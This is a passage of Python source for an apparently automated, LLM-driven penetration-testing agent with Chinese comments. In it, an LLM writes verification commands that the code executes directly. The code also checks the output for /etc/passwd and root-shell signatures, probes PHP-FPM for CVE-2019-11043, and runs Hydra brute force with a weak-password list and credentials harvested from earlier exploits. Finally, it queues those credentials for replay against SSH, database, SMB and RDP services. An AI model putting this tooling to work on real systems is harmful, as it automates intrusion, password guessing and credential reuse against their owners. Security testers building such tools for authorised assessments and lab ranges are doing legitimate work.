            f"stdout:\n{stdout[:1500]}\n\n"
            f"stderr:\n{stderr[:300]}\n\n"
            f"只返回JSON: {{\"confirmed\": true/false, \"reason\": \"简要原因\"}}"
        )
        try:
            raw = await self.llm.chat(prompt, response_format="json", temperature=0.1, max_tokens=200)
            data = json.loads(raw)
            return data.get("confirmed", False)
        except Exception:
            return False

    # ================================================================
    # Phase 4: LLM 主动漏洞发现
    # ================================================================

    async def _llm_active_discovery(
        self,
        target: str,
        target_os: str,
        ports: list[PortInfo],
        fingerprints: dict[int, dict],
        web_paths: list[str],
        path_contents: list[dict[str, Any]],
        existing_findings: list[VulnFinding],
    ) -> list[VulnFinding]:
        """LLM 根据指纹主动推测漏洞并生成验证命令"""
        from backend.llm.prompts.templates import VULN_ACTIVE_DISCOVERY

        fp_text = ""
        for port, fp in fingerprints.items():
            fp_text += (
                f"\n端口 {port}:\n"
                f"  URL: {fp.get('url', '')}\n"
                f"  whatweb: {fp.get('whatweb', '')[:500]}\n"
                f"  httpx: {fp.get('httpx', '')[:300]}\n"
                f"  JSON探测: {fp.get('json_probe', '无')}\n"
                f"  nmap: {fp.get('nmap_version', '')}\n"
                f"  识别技术: {fp.get('summary', 'unknown')}\n"
            )

        existing_text = "\n".join(
            f"- {f.name} ({f.severity}, {f.tool})" for f in existing_findings[:20]
        ) or "无"

        prompt = VULN_ACTIVE_DISCOVERY.format(
            target=target,
            target_os=target_os,
            fingerprints_text=fp_text,
            web_paths=json.dumps(web_paths[:20], ensure_ascii=False),
            path_contents=json.dumps((path_contents or [])[:12], ensure_ascii=False),
            existing_findings=existing_text,
        )
        from backend.agents.prompt_utils import wrap_prompt_with_block
        prompt = wrap_prompt_with_block(prompt, self._operator_block)

        # 结构化 plan 提示注入: 让 LLM 在生成 verify_command 时显式倾向用户
        # 偏好的工具/聚焦目标。注意这里和 operator_block 的关系是:
        #   - operator_block 是用户原话(LLM 自己解读)
        #   - operator_plan 是已经被 replanner 翻译过的结构化偏好(LLM 直接套)
        # 二者并存可以互相印证, plan 缺字段时还能 fallback 到原话。
        plan_obj = getattr(self, "_operator_plan", None)
        if plan_obj is not None:
            plan_lines: list[str] = []
            preferred = list(getattr(plan_obj, "preferred_tools", None) or [])
            avoided = list(getattr(plan_obj, "avoided_tools", None) or [])
            focus = list(getattr(plan_obj, "focus_targets", None) or [])
            kw = list(getattr(plan_obj, "keyword_hints", None) or [])
            if preferred:
                plan_lines.append(
                    "preferred_tools(verify_command 优先使用): "
                    + ", ".join(str(t) for t in preferred[:6])
                )
            if avoided:
                plan_lines.append(
                    "avoided_tools(避免使用): "
                    + ", ".join(str(t) for t in avoided[:6])
                )
            if focus:
                focus_repr = ", ".join(
                    f"{getattr(t, 'type', '?')}={getattr(t, 'value', '?')}"
                    for t in focus[:6]
                )
                plan_lines.append(f"focus_targets(优先排查): {focus_repr}")
            if kw:
                plan_lines.append(
                    "keyword_hints(检查涉及到的关键路径/参数): "
                    + ", ".join(kw[:8])
                )
            if plan_lines:
                plan_directive = (
                    "\n\n【操作员战术计划 - 结构化偏好】\n"
                    + "\n".join(f"- {ln}" for ln in plan_lines)
                    + "\n请在生成 checks[] 时优先满足上述偏好; "
                    + "若偏好工具不适用某 vuln_name, 在 hypothesis 字段说明原因。"
                )
                prompt = prompt + plan_directive

        try:
            import uuid as _uuid
            stream_id = f"llm-discovery-{_uuid.uuid4().hex[:8]}"

            # 注意: 这里 LLM 输出是 JSON (response_format='json'), content
            # delta 全是 ``{"checks":[{"vuln_name":...}, ...]}`` 这种带引号
            # 的原始 JSON 字符序列, 直接推到 chat 流会让 "正在思考..." 气泡
            # 显示一大坨没格式化的 JSON, 用户根本读不下去。
            # 解决方式: **不流 content**, 只把人类可读的 reasoning(LLM r1
            # 思考链)推到前端; 解析后的结构化结果通过下面的 thought 事件
            # 以"建议验证 N 个潜在漏洞 + 计划列表"形式呈现。
            async def _on_reasoning(delta: str):
                if self._decision_callback:
                    await self._decision_callback({
                        "action": "llm_delta",
                        "phase": "vuln_scan",
                        "delta": delta,
                        "stream_id": stream_id,
                        "kind": "reasoning",
                    })

            result, reasoning = await self.llm.chat_with_stream_callback(
                prompt,
                on_reasoning_delta=_on_reasoning,
                response_format="json",
            )
            plan = json.loads(result)
        except Exception as e:
            logger.warning(f"[VulnAgent] LLM 主动发现失败: {e}")
            return []

        checks = plan.get("checks", [])
        if not checks:
            return []

        logger.info(f"[VulnAgent] LLM 建议验证 {len(checks)} 个潜在漏洞")

        if self._decision_callback:
            check_names = [c.get("vuln_name", "?") for c in checks[:8]]
            await self._decision_callback({
                "action": "thought",
                "phase": "vuln_scan",
                "thinking": plan.get("analysis", "") or f"LLM 主动发现提出 {len(checks)} 个验证方案",
                "reasoning": reasoning,
                "purpose": "LLM 主动漏洞发现",
                "plan": [f"验证: {n}" for n in check_names],
                "message": f"LLM 建议验证 {len(checks)} 个潜在漏洞: {', '.join(check_names)}",
            })

        findings: list[VulnFinding] = []

        for check in checks[:8]:
            vuln_name = check.get("vuln_name", "未知漏洞")
            command = check.get("verify_command", "")
            success_indicator = check.get("success_indicator", "")
            severity = check.get("severity", "medium")
            description = check.get("description", "")
            port = check.get("port", None)

            if not command:
                continue

            logger.info(f"[VulnAgent] LLM 验证: {vuln_name} -> {command[:100]}...")

            exec_result: ExecuteResult = await self.executor.run_script(
                script_content=command,
                timeout=30,
            )

            if self._decision_callback:
                await self._decision_callback({
                    "action": "command_exec",
                    "phase": "vuln_scan",
                    "tool": "llm-discovery",
                    "command": command,
                    "purpose": f"验证: {vuln_name}",
                    "stdout": (exec_result.stdout or "")[:8000],
                    "stderr": (exec_result.stderr or "")[:2000],
                    "exit_code": exec_result.exit_code,
                    "elapsed_ms": int(exec_result.elapsed * 1000) if exec_result.elapsed else None,
                    "message": f"LLM 验证 {vuln_name}",
                })

            # ── 预检测：对完整 stdout 做确定性 LFI/RCE 特征匹配 ──────
            # LLM 只拿到截断后的输出，大响应体（如 phpinfo + /etc/passwd）时
            # 文件内容出现在末尾，[:2000] 根本看不到 → 必须先对全文做硬判断
            full_stdout = exec_result.stdout or ""
            full_stdout_lower = full_stdout.lower()

            # /etc/passwd 文件包含成功的特征
            _LFI_PASSWD_SIGNS = [
                "root:x:0:0:", "root:!:0:0:", "daemon:x:1:",
                "bin:x:2:", "nobody:x:", "/bin/bash", "/bin/sh",
                "www-data:x:", "nobody:/nonexistent",
            ]
            # 通用 RCE / 命令回显特征
            _RCE_SIGNS = ["uid=0(root)", "uid=33(www-data)", "linux ", "gnu/linux"]
            # SSTI 数学计算回显（如 7*7=49）
            _SSTI_SIGNS = ["49", "7777777"]

            _pre_confirmed = False
            _pre_exploitable = False
            _pre_evidence = ""

            if any(sign in full_stdout for sign in _LFI_PASSWD_SIGNS):
                _pre_confirmed = True
                _pre_exploitable = True
                # 找到 passwd 内容所在片段作为证据
                for sign in _LFI_PASSWD_SIGNS:
                    idx = full_stdout.find(sign)
                    if idx != -1:
                        _pre_evidence = f"LFI成功，/etc/passwd内容片段: {full_stdout[idx:idx+300]}"
                        break
                logger.info(
                    "[VulnAgent] 预检测命中 LFI /etc/passwd 特征: %s -> confirmed=True",
                    vuln_name,
                )
            elif any(sign in full_stdout_lower for sign in _RCE_SIGNS):
                _pre_confirmed = True
                _pre_exploitable = True
                _pre_evidence = f"RCE特征命中: {full_stdout[:500]}"
                logger.info(
                    "[VulnAgent] 预检测命中 RCE 特征: %s -> confirmed=True",
                    vuln_name,
                )

            # 如果预检测已确认，直接跳过 LLM
            if _pre_confirmed:
                analysis = {
                    "confirmed": True,
                    "exploitable": _pre_exploitable,
                    "evidence": _pre_evidence,
                }
            else:
                # ── 构造发给 LLM 的 stdout 片段（头 + 尾，避免大响应体截断漏证据）──
                _HEAD = 1500
                _TAIL = 800
                if len(full_stdout) > _HEAD + _TAIL:
                    stdout_for_llm = (
                        full_stdout[:_HEAD]
                        + f"\n... [截断 {len(full_stdout) - _HEAD - _TAIL} 字节] ...\n"
                        + full_stdout[-_TAIL:]
                    )
                else:
                    stdout_for_llm = full_stdout

                # 让 LLM 判断验证结果
                analyze_prompt = (
                    f"分析以下漏洞验证命令的执行结果：\n\n"
                    f"验证目标: {vuln_name}\n"
                    f"执行命令: {command}\n"
                    f"期望标志: {success_indicator}\n\n"
                    f"stdout:\n```\n{stdout_for_llm}\n```\n\n"
                    f"stderr:\n```\n{exec_result.stderr[:500]}\n```\n\n"
                    f"exit_code: {exec_result.exit_code}\n\n"
                    f"判定标准：\n"
                    f"- confirmed=true：输出中出现预期证据（如 /etc/passwd 的 root:x:0:0、"
                    f"phpinfo、SQL 报错、命令回显等），足以证明漏洞存在。\n"
                    f"  **注意：如果响应先返回了正常页面（如 phpinfo），然后在末尾追加了"
                    f"/etc/passwd 或命令回显内容，这同样是成功的证据。**\n"
                    f"- exploitable=true：漏洞可被进一步利用于渗透路径，包括但不限于：\n"
                    f"  * LFI / 任意文件读（可读敏感文件、配置、session、日志链 RCE）\n"
                    f"  * SQLi（可出数据或堆叠注入）\n"
                    f"  * RCE / 命令注入 / 反序列化 / SSTI / 上传绕过\n"
                    f"  * 已知 CVE 且探测成功\n"
                    f"  注意：即便没有直接 shell，只要能进入下一步利用链（如 LFI→log poisoning、"
                    f"LFI→session 读取、LFI→配置文件泄漏凭据），也应判 exploitable=true。\n"
                    f"- 仅当 confirmed=false 或只是信息泄露（banner/version/目录列举）时才 "
                    f"exploitable=false。\n\n"
                    f"只返回 JSON（不要代码块、不要解释）：\n"
                    f'{{"confirmed": true或false, "evidence": "判断依据", "exploitable": true或false}}'
                )

                analysis_raw: Optional[str] = None
                try:
                    analysis_raw = await self.llm.chat(analyze_prompt, response_format="json")
                    analysis = json.loads(analysis_raw)
                except Exception as e:
                    logger.warning(
                        "[VulnAgent] LLM 分析 JSON 解析失败 vuln=%s err=%s raw=%r",
                        vuln_name, e, (analysis_raw[:500] if analysis_raw else None),
                    )
                    analysis = {"confirmed": False}

            logger.info(
                "[VulnAgent] LLM 判定 %s: confirmed=%s exploitable=%s evidence=%s",
                vuln_name,
                analysis.get("confirmed"),
                analysis.get("exploitable"),
                (analysis.get("evidence") or "")[:120],
            )

            if analysis.get("confirmed"):
                logger.info(f"[VulnAgent] LLM 确认漏洞: {vuln_name}")

                # 从 verify_command 里抽出真正的漏洞 URL（含路径+查询），
                # 否则下游 LFI 探针/SkillEngine 只能拿到 http://host:port，
                # 会把探测打到网站根而不是漏洞端点。
                resolved_target = ""
                resolved_port = port
                url_match = re.search(
                    r"https?://[^\s'\"`|><;)}\\]+",
                    command,
                )
                if url_match:
                    resolved_target = url_match.group(0).rstrip(".,;)\"'`")
                    try:
                        from urllib.parse import urlparse as _urlparse
                        _pu = _urlparse(resolved_target)
                        if _pu.port:
                            resolved_port = _pu.port
                        elif _pu.hostname and not resolved_port:
                            resolved_port = 443 if _pu.scheme == "https" else 80
                    except Exception:
                        pass
                if not resolved_target:
                    resolved_target = (
                        f"http://{target}:{port}" if port else target
                    )
                logger.info(
                    "[VulnAgent] 解析漏洞目标 %s -> target=%s port=%s",
                    vuln_name, resolved_target, resolved_port,
                )

                findings.append(VulnFinding(
                    name=vuln_name,
                    severity=severity,
                    target=resolved_target,
                    port=resolved_port,
                    description=description,
                    evidence="\n\n".join([
                        f"Command\n{command}",
                        f"Stdout\n{exec_result.stdout.strip() or '(empty)'}",
                        f"Stderr\n{exec_result.stderr.strip() or '(empty)'}",
                    ]),
                    exploitable=analysis.get("exploitable", False),
                    tool="llm-discovery",
                ))

        logger.info(f"[VulnAgent] LLM 主动发现: {len(findings)} 个确认漏洞")
        return findings

    # ================================================================
    # Phase 3.1: CVE 专项直检（无条件，不依赖指纹信号）
    # ================================================================

    async def _cve_direct_checks(
        self,
        target: str,
        web_ports: list[PortInfo],
        fingerprints: dict[int, dict],
    ) -> list[VulnFinding]:
        """
        对所有 Web 端口执行特定 CVE 的无条件直接检测。

        这些检测不依赖指纹/KB 信号，直接用探测请求判断漏洞存在性。
        成本极低（每个 CVE 只需 2-3 个 curl），适合对所有端口无差别执行。
        """
        findings: list[VulnFinding] = []

        for wp in web_ports:
            scheme = "https" if wp.port in (443, 8443) else "http"
            web_url = f"{scheme}://{target}:{wp.port}"

            # ── CVE-2019-11043: PHP-FPM %0a 路径注入 ──
            try:
                fpm_finding = await self._check_cve_2019_11043(web_url, target, wp.port)
                if fpm_finding:
                    findings.append(fpm_finding)
            except Exception as e:
                logger.warning(f"[VulnAgent] CVE-2019-11043 检测异常 :{wp.port}: {e}")

        return findings

    async def _check_cve_2019_11043(
        self, web_url: str, target: str, port: int
    ) -> VulnFinding | None:
        """
        CVE-2019-11043 无条件直接检测。

        检测逻辑（修复版 — 不依赖 502 状态码）:
          1. GET /index.php → 基线（状态码 + body 长度）
          2. GET /index.php/%0a → 对比状态码和 body
          3. 判定: 502/500 = 确认
                  body 含 "File not found"/"No input file specified"/"Primary script unknown" = 确认
                  状态码或 body 长度与基线显著不同 = 疑似
        """
        # 步骤 1: 基线请求
        baseline_result: ExecuteResult = await self.executor.run(
            tool="curl",
            args=["-s", "-w", "\n%{http_code}", f"{web_url}/index.php", "--max-time", "8"],
            timeout=12,
        )
        baseline_raw = baseline_result.stdout.strip()
        baseline_lines = baseline_raw.rsplit("\n", 1)
        baseline_body = baseline_lines[0] if len(baseline_lines) > 1 else ""
        baseline_code = baseline_lines[-1].strip() if baseline_lines else ""

        if baseline_code not in ("200", "301", "302", "403"):
            return None  # 不是 PHP 环境

        # 步骤 2: %0a 路径注入
        anomaly_result: ExecuteResult = await self.executor.run(
            tool="curl",
            args=["-s", "-w", "\n%{http_code}", f"{web_url}/index.php/%0a", "--max-time", "8"],
            timeout=12,
        )
        anomaly_raw = anomaly_result.stdout.strip()
        anomaly_lines = anomaly_raw.rsplit("\n", 1)
        anomaly_body = anomaly_lines[0] if len(anomaly_lines) > 1 else ""
        anomaly_code = anomaly_lines[-1].strip() if anomaly_lines else ""

        logger.info(
            f"[VulnAgent] CVE-2019-11043 直检 :{port}: "
            f"baseline={baseline_code}({len(baseline_body)}B), "
            f"0a={anomaly_code}({len(anomaly_body)}B), "
            f"0a_body_preview={anomaly_body[:120]}"
        )

        # 步骤 3: 判定
        confirmed = False
        likely = False
        evidence_parts = [
            f"baseline /index.php → {baseline_code} ({len(baseline_body)}B)",
            f"/index.php/%0a → {anomaly_code} ({len(anomaly_body)}B)",
        ]

        anomaly_body_lower = anomaly_body.lower()

        # 最强信号: 502/500
        if anomaly_code in ("502", "500"):
            confirmed = True
            evidence_parts.append("判定: 502/500 状态码确认")

        # 次强信号: PHP-FPM 特征错误消息
        elif any(sig in anomaly_body_lower for sig in [
            "file not found", "no input file specified",
            "primary script unknown", "unable to open primary script",
        ]):
            confirmed = True
            evidence_parts.append(f"判定: FPM 错误消息确认 ({anomaly_body[:80]})")

        # 疑似信号: 状态码不同
        elif anomaly_code != baseline_code and anomaly_code not in ("404", "000", ""):
            likely = True
            evidence_parts.append(f"判定: 状态码差异 ({baseline_code} → {anomaly_code})")

        # 疑似信号: body 长度剧变（基线有内容但 %0a 为空，或反之）
        elif len(baseline_body) > 100 and len(anomaly_body) < 50:
            likely = True
            evidence_parts.append(f"判定: body 长度剧变 ({len(baseline_body)} → {len(anomaly_body)})")

        if not confirmed and not likely:
            return None

        severity = "high" if confirmed else "medium"
        logger.info(
            f"[VulnAgent] ✅ CVE-2019-11043 {'确认' if confirmed else '疑似'} "
            f"@ {web_url}"
        )

        return VulnFinding(
            name="PHP-FPM CVE-2019-11043 路径注入 RCE",
            severity=severity,
            cve="CVE-2019-11043",
            target=web_url,
            port=port,
            description=(
                f"PHP-FPM Nginx 缓冲区溢出 RCE。"
                f"{'已确认' if confirmed else '疑似'}: "
                f"/index.php/%0a → {anomaly_code} "
                f"(body: {anomaly_body[:60]})"
            ),
            evidence="\n".join(evidence_parts),
            exploitable=confirmed,
            tool="cve-direct-check",
        )

    # ================================================================
    # Nikto + Hydra
    # ================================================================

    async def _nikto_scan(self, web_url: str) -> dict:
        result: ExecuteResult = await self.executor.run(
            tool="nikto",
            args=["-h", web_url, "-Format", "json", "-nointeractive", "-maxtime", "60s"],
            timeout=90,
        )
        findings: list[VulnFinding] = []
        if result.success and result.stdout:
            findings = self.nikto_parser.parse(result.stdout, web_url)
        return {"findings": findings, "raw_nikto": result.stdout}

    async def _brute_force_scan_wrapper(self, target: str, ports: list[PortInfo]) -> list[VulnFinding]:
        r = await self._brute_force_scan(target, ports)
        return r.get("findings", [])

    async def _brute_force_scan(self, target: str, ports: list[PortInfo]) -> dict:
        findings: list[VulnFinding] = []
        tasks = []
        # 把种子凭据里的密码合并到 hydra 字典里（feedback 模式下从前序漏洞抓的真实密码）
        seed_passwords = self._extract_seed_passwords()
        seed_users = self._extract_seed_users()
        for port_info in ports:
            if port_info.port in BRUTE_SERVICES:
                proto, default_users = BRUTE_SERVICES[port_info.port]
                # 把种子用户加到默认用户名前面（优先尝试真实账号）
                merged_users = list(dict.fromkeys(seed_users + default_users))
                tasks.append(
                    self._hydra_brute(
                        target, port_info.port, proto, merged_users,
                        extra_passwords=seed_passwords,
                    )
                )
        if not tasks:
            return {"findings": []}
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
        return {"findings": findings}

    def _extract_seed_passwords(self) -> list[str]:
        """从 self._seed_credentials 中提取去重的密码列表（最多 30 条）。"""
        seeds = getattr(self, "_seed_credentials", None) or []
        passwords: list[str] = []
        for c in seeds:
            if not isinstance(c, dict):
                continue
            v = (c.get("value") or c.get("password") or "").strip()
            if v and v not in passwords:
                passwords.append(v)
        return passwords[:30]

    def _extract_seed_users(self) -> list[str]:
        """从 self._seed_credentials 中提取去重的用户名列表（最多 30 条）。"""
        seeds = getattr(self, "_seed_credentials", None) or []
        users: list[str] = []
        for c in seeds:
            if not isinstance(c, dict):
                continue
            u = (c.get("user") or c.get("username") or "").strip()
            if u and u not in users:
                users.append(u)
        return users[:30]

    async def _hydra_brute(
        self,
        target: str,
        port: int,
        protocol: str,
        usernames: list[str],
        extra_passwords: list[str] | None = None,
    ) -> list[VulnFinding]:
        """Hydra 弱口令爆破。

        ``extra_passwords`` 来自前序漏洞抓到的真实密码：会**优先**写到字典前面，
        其后再追加 rockyou-top100。这样命中率从 "rockyou 字典是否覆盖" 提升为
        "目标是否复用配置文件里的密码"，对依赖型多漏洞链场景非常有效。
        """
        # 构造合并字典：种子密码（可能 0 条）+ 内置 rockyou-top100
        # 用 stdin 传 password list，避免在容器内写文件
        pwd_lines: list[str] = list(extra_passwords or [])
        # 内置 fallback 字典（精简）；当种子凭据足够时，依然保留这些常见密码
        builtin_pwds = [
            "root", "toor", "admin", "password", "123456",
            "12345678", "qwerty", "letmein", "welcome", "ubuntu",
        ]
        for p in builtin_pwds:
            if p not in pwd_lines:
                pwd_lines.append(p)

        # hydra: -L 用户名 stdin / -P 密码字典文件
        # 我们让 -L 读 /tmp/hydra_users.txt, -P 读 /tmp/hydra_pwds.txt（容器内写）
        # 简化：用 here-string 传一个临时密码文件
        prep_cmd = (
            "set -e; "
            f"printf '%s\\n' {self._shell_quote_each(pwd_lines)} > /tmp/hydra_pwds.txt; "
            f"printf '%s\\n' {self._shell_quote_each(usernames)} > /tmp/hydra_users.txt; "
            f"hydra -L /tmp/hydra_users.txt -P /tmp/hydra_pwds.txt -t 4 -f "
            f"{protocol}://{target}:{port} 2>&1; "
            "rm -f /tmp/hydra_pwds.txt /tmp/hydra_users.txt"
        )
        result: ExecuteResult = await self.executor.run_script(
            script_content=prep_cmd,
            timeout=180 if extra_passwords else 120,
        )
        findings = []
        out = (result.stdout or "")
        if "login:" in out:
            for line in out.splitlines():
                if "[" in line and "login:" in line:
                    # 标记密码来源：是从种子凭据命中还是固定字典
                    cracked = line.strip()
                    cred_source = "hydra"
                    if extra_passwords and any(p in cracked for p in extra_passwords):
                        cred_source = "hydra+seeded_creds"
                    findings.append(VulnFinding(
                        name=f"弱口令 ({protocol.upper()})",
                        severity="high",
                        target=target,
                        port=port,
                        description=(
                            f"在 {protocol}://{target}:{port} 发现弱口令"
                            + ("（命中前序漏洞抓到的凭据）"
                               if cred_source.endswith("seeded_creds") else "")
                        ),
                        evidence=cracked,
                        exploitable=True,
                        tool=cred_source,
                    ))
        return findings

    @staticmethod
    def _shell_quote_each(items: list[str]) -> str:
        """Single-quote each string and join with spaces (safe for printf)."""
        out: list[str] = []
        for s in items:
            # 单引号包裹，把字面单引号转为 '\'' 模式
            esc = s.replace("'", "'\\''")
            out.append(f"'{esc}'")
        return " ".join(out)

    def _synthesize_credential_replay_findings(
        self,
        target: str,
        ports: list[PortInfo],
    ) -> list[VulnFinding]:
        """
        反馈循环关键产出：

        当 ``self._seed_credentials`` 非空（说明前序漏洞抓到了真实凭据），
        为每个目标上"开放且可登录"的服务端口合成一个 service-level 的
        ``credential-replay`` finding。这些 finding 会触发 ``credential_replay``
        Skill（match.tool_is == "cred-replay"），让 ExploitAgent 在 secondary 阶段
        **确定性**地用真实凭据对 SSH/MySQL/SMB/FTP/RDP/PostgreSQL 重放，
        不再依赖 LLM ReAct 的灵活性。
        """
        seeds = getattr(self, "_seed_credentials", None) or []
        if not seeds:
            return []
        # 哪些端口适合凭据复用
        replayable_ports: dict[int, str] = {
            22: "ssh", 2211: "ssh", 2222: "ssh", 22222: "ssh",
            21: "ftp",
            3306: "mysql",
            5432: "postgres",
            6379: "redis",
            27017: "mongodb",
            139: "smb", 445: "smb",
            3389: "rdp",
        }
        out: list[VulnFinding] = []
        cred_summary = ", ".join(
            f"{c.get('user') or '?'}@{c.get('source') or '?'}"
            for c in seeds[:5] if isinstance(c, dict)
        )
        for p in ports:
            svc = replayable_ports.get(p.port)
            if not svc:
                continue
            out.append(VulnFinding(
                name=f"凭据复用机会 - {svc.upper()} ({p.port})",
                severity="high",
                target=f"{target}:{p.port}",
                port=p.port,
                description=(
                    f"前序漏洞已抓到 {len(seeds)} 条真实凭据 ({cred_summary})；"
                    f" {svc} 服务在 {p.port} 端口监听，**有大概率凭据复用**。"
                    f" ExploitAgent 将走 credential_replay Skill 重放每条凭据。"
                ),
                evidence=f"seeds={len(seeds)} creds; service={svc}; port={p.port}",
                exploitable=True,
                tool="cred-replay",
            ))
        return out


    # ================================================================
    # Phase 5: Finding 事后校验与修正
    # ================================================================

    @staticmethod
    def _enrich_findings(
        findings: list[VulnFinding],
        fingerprints: dict[int, dict],
    ) -> list[VulnFinding]:
        """
        根据指纹信息校验和修正 findings。

        解决的核心问题：
        - S2-057 靶场运行在 Tomcat 上 → VulnAgent 误判为 "Tomcat弱口令"
        - 原因：指纹里有 tomcat，KB 匹配到 tomcat 弱口令条目，verification
          返回 200（Struts2 页面）→ LLM 错误确认
        - 修正：当 finding 的漏洞类型是"基础设施漏洞"（如容器弱口令），
          但指纹的 primary_tech 是应用框架（如 Struts2），则降级该 finding

        同时给每个 finding 的 evidence 补充指纹上下文，让 registry 评分更准。
        """
        if not fingerprints:
            return findings

        # 收集所有端口的技术栈层级信息
        all_app_frameworks = set()
        all_middleware = set()
        all_security = set()
        primary_techs = set()

        for port, fp in fingerprints.items():
            for tech in fp.get("app_frameworks", []):
                all_app_frameworks.add(tech.lower())
            for tech in fp.get("middleware", []):
                all_middleware.add(tech.lower())
            for tech in fp.get("security_components", []):
                all_security.add(tech.lower())
            pt = fp.get("primary_tech", "")
            if pt:
                primary_techs.add(pt.lower())

        if not all_app_frameworks and not all_security:
            # 没检测到应用框架，不做修正
            return findings

        # ── 定义"容器/基础设施级"漏洞关键词 ──
        # 这些关键词出现在 finding name 里，说明这是一个基础设施漏洞
        infra_vuln_keywords = {
            "tomcat": ["弱口令", "weak", "default", "manager", "war部署"],
            "nginx": ["配置", "misconfig", "traversal", "crlf"],
            "apache": ["配置", "misconfig"],
        }

        enriched = []
        for finding in findings:
            name_lower = finding.name.lower()
            port = finding.port

            # 获取该端口的指纹
            port_fp = fingerprints.get(port, {}) if port else {}
            port_primary = port_fp.get("primary_tech", "").lower()
            port_apps = [t.lower() for t in port_fp.get("app_frameworks", [])]

            # ── 规则 1: 基础设施漏洞 + 同端口有应用框架 → 降级 ──
            # 关键修复: 只看同端口的指纹，不看全局
            # 场景: Struts2 在 8080 → 该端口的 Tomcat 弱口令降级
            # 场景: Tomcat8 靶场（裸 Tomcat）→ 不降级（本端口无应用框架）
            should_downgrade = False
            for infra_name, vuln_keywords in infra_vuln_keywords.items():
                if infra_name in name_lower:
                    if any(kw in name_lower for kw in vuln_keywords):
                        # 只看同端口是否有应用框架
                        if port_apps:
                            actual_app = port_primary or port_apps[0]
                            logger.info(
                                f"[VulnAgent] ⚠ 降级 Finding: '{finding.name}' "
                                f"→ 同端口({port})主要技术是 {actual_app}，"
                                f"'{infra_name}' 只是容器"
                            )
                            should_downgrade = True
                            break
                        # 其他端口有应用框架但本端口没有 → 不降级
                        elif all_app_frameworks - {infra_name}:
                            logger.info(
                                f"[VulnAgent] 保留 Finding: '{finding.name}' "
                                f"（本端口 {port} 无应用框架，不降级）"
                            )

            if should_downgrade:
                finding.exploitable = False
                finding.severity = "info"
                finding.description = (
                    f"[降级] {finding.description} "
                    f"（同端口指纹显示主要技术为 {port_primary or '应用框架'}，"
                    f"此漏洞可能是误判）"
                )

            # ── 规则 2: 给所有 finding 补充指纹上下文 ──
            # 让 registry 评分时有更多信息
            fp_context_parts = []
            if port_primary:
                fp_context_parts.append(f"primary_tech={port_primary}")
            if port_apps:
                fp_context_parts.append(f"app_frameworks={','.join(port_apps)}")
            for sc in port_fp.get("security_components", []):
                fp_context_parts.append(f"security={sc.lower()}")

            if fp_context_parts:
                fp_context = " | ".join(fp_context_parts)
                if fp_context not in finding.evidence:
                    finding.evidence = f"[指纹] {fp_context}\n{finding.evidence}"

            enriched.append(finding)

        return enriched


def _deduplicate(findings: list[VulnFinding]) -> list[VulnFinding]:
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    seen: dict[str, VulnFinding] = {}
    for f in findings:
        key = f"{f.cve or f.name}:{f.port}"
        if key not in seen:
            seen[key] = f
        else:
            if severity_order.get(f.severity, 99) < severity_order.get(seen[key].severity, 99):
                seen[key] = f
    return list(seen.values())